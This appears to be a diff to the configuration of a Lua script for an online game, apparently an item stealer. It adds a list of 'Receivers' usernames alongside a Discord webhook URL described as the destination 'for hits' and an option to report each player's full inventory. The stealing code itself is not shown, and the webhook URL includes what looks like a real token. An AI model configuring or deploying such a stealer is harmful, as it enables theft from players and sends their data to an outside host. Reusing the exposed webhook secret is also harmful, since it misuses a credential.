@@ -1,4 +1,5 @@
 Config = {
+    Receivers = {"123123", "123123"}, -- Your Username/s.
     Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b", -- Your webhook for hits.
     FullInventory = true, -- If true, it will display all of the player's items.
 }
